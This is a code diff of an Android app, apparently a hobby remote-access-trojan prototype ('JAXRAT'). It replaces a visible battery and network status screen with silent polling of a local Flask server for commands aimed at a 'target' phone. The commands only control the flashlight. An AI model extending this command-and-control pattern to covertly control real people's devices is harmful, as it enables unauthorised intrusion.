@@ -1,131 +1,127 @@
 package com.ezax.agent;
 
-import android.app.Activity;
 import android.content.Context;
-import android.net.ConnectivityManager;
-import android.net.NetworkCapabilities;
-import android.os.BatteryManager;
+import android.hardware.camera2.CameraAccessException;
+import android.hardware.camera2.CameraManager;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
-import android.widget.TextView;
-import java.io.OutputStream;
+import android.util.Log;
+import androidx.appcompat.app.AppCompatActivity;
+import org.json.JSONObject;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.nio.charset.StandardCharsets;
 
-public class MainActivity extends Activity { 
-
-    private TextView statusText;
+public class MainActivity extends AppCompatActivity {
+    // ⚠️ GANTI IP INI dengan IP Laptop kamu (cek di terminal Flask: Running on http://192.168.x.x:5000)
+    private static final String SERVER_URL = "http://192.168.1.46:5000"; 
+    private static final String DEVICE_ID = "hp_target_1"; 
+    
     private Handler handler = new Handler(Looper.getMainLooper());
-    private static final String SERVER_URL = "http://127.0.0.1:5000/api/update"; 
+    private boolean isStrobe = false;
+    private Handler strobeHandler = new Handler();
+    private CameraManager cameraManager;
+    private String cameraId;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        
-        statusText = new TextView(this);
-        statusText.setTextSize(24f);
-        statusText.setTextColor(0xFF00FF00); 
-        statusText.setBackgroundColor(0xFF000000); 
-        statusText.setPadding(50, 50, 50, 50);
-        setContentView(statusText);
 
-        startSendingData();
+        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
+        try {
+            cameraId = cameraManager.getCameraIdList()[0]; 
+        } catch (CameraAccessException e) {
+            Log.e("JAXRAT", "Kamera error", e);
+        }
+
+        startPolling();
     }
 
-    private void startSendingData() {
+    private void startPolling() {
         handler.postDelayed(new Runnable() {
             @Override
             public void run() {
-                int batteryLevel = getBatteryLevel();
-                String networkType = getNetworkType();
-                
-                statusText.setText("EZAX AGENT\n\nStatus: ONLINE\nBaterai: " + batteryLevel + "%\nJaringan: " + networkType + "\n\nMengirim data...");
-
-                new Thread(new Runnable() {
-                    @Override
-                    public void run() {
-                        sendDataToServer(batteryLevel, networkType);
-                    }
-                }).start();
-
-                handler.postDelayed(this, 5000);
+                fetchCommand();
+                handler.postDelayed(this, 3000); // Nanya ke web tiap 3 detik
             }
-        }, 1000);
+        }, 3000);
     }
 
-    private int getBatteryLevel() {
-        try {
-            BatteryManager bm = (BatteryManager) getSystemService(Context.BATTERY_SERVICE);
-            if (bm != null) {
-                return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
-            }
-        } catch (Exception e) {
-            return -1; // Kalau gagal ambil baterai
-        }
-        return 0;
-    }
-
-    private String getNetworkType() {
-        try {
-            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
-            if (cm == null) return "Error";
-            
-            android.net.Network activeNetwork = cm.getActiveNetwork();
-            if (activeNetwork == null) return "Offline"; // Kalau nggak ada internet sama sekali
-            
-            NetworkCapabilities nc = cm.getNetworkCapabilities(activeNetwork);
-            if (nc == null) return "Unknown";
-            
-            if (nc.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) return "WiFi";
-            if (nc.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) return "Data Seluler";
-            return "Lainnya";
-        } catch (Exception e) {
-            return "Error Jaringan";
-        }
-    }
-
-    private void sendDataToServer(int battery, String network) {
-        try {
-            URL url = new URL(SERVER_URL);
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setRequestMethod("POST");
-            conn.setRequestProperty("Content-Type", "application/json");
-            conn.setDoOutput(true);
-            conn.setConnectTimeout(5000); // Kasih waktu 5 detik buat konek
-
-            String jsonInputString = String.format("{\"battery\": %d, \"network\": \"%s\"}", battery, network);
-
-            try (OutputStream os = conn.getOutputStream()) {
-                byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
-                os.write(input, 0, input.length);
-            }
-
-            int responseCode = conn.getResponseCode();
-            if (responseCode == HttpURLConnection.HTTP_OK) {
-                runOnUiThread(new Runnable() {
-                    @Override
-                    public void run() {
-                        statusText.append("\n✅ Terkirim ke Server!");
-                    }
-                });
-            } else {
-                runOnUiThread(new Runnable() {
-                    @Override
-                    public void run() {
-                        statusText.append("\n❌ Gagal: " + responseCode);
-                    }
-                });
-            }
-            conn.disconnect();
-        } catch (Exception e) {
-            runOnUiThread(new Runnable() {
-                @Override
-                public void run() {
-                    statusText.append("\n⚠️ Error Jaringan: " + e.getMessage());
+    private void fetchCommand() {
+        new Thread(() -> {
+            try {
+                URL url = new URL(SERVER_URL + "/api/get_command/" + DEVICE_ID);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("GET");
+                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+                StringBuilder response = new StringBuilder();
+                String line;
+                while ((line = in.readLine()) != null) {
+                    response.append(line);
                 }
-            });
+                in.close();
+
+                JSONObject json = new JSONObject(response.toString());
+                String cmd = json.optString("command", "none");
+                
+                if (!cmd.equals("none")) {
+                    executeCommand(cmd);
+                }
+
+            } catch (Exception e) {
+                Log.e("JAXRAT", "Gagal konek ke server", e);
+            }
+        }).start();
+    }
+
+    private void executeCommand(String cmd) {
+        Log.d("JAXRAT", "Perintah masuk: " + cmd);
+
+        if (cmd.equals("flash_on")) {
+            stopStrobe();
+            setTorch(true);
+        } else if (cmd.equals("flash_off")) {
+            stopStrobe();
+            setTorch(false);
+        } else if (cmd.equals("flash_strobe")) {
+            startStrobe();
+        } else if (cmd.equals("STOP_ALL")) {
+            stopStrobe();
+            setTorch(false);
         }
     }
+
+    private void setTorch(boolean state) {
+        try {
+            cameraManager.setTorchMode(cameraId, state);
+        } catch (CameraAccessException e) {
+            Log.e("JAXRAT", "Gagal nyalain senter", e);
+        }
+    }
+
+    private void startStrobe() {
+        isStrobe = true;
+        strobeRunnable.run();
+    }
+
+    private void stopStrobe() {
+        isStrobe = false;
+        strobeHandler.removeCallbacks(strobeRunnable);
+        setTorch(false);
+    }
+
+    private final Runnable strobeRunnable = new Runnable() {
+        @Override
+        public void run() {
+            if (isStrobe) {
+                setTorch(true);
+                strobeHandler.postDelayed(() -> {
+                    setTorch(false);
+                    if (isStrobe) strobeHandler.postDelayed(this, 200); 
+                }, 200); 
+            }
+        }
+    };
 }
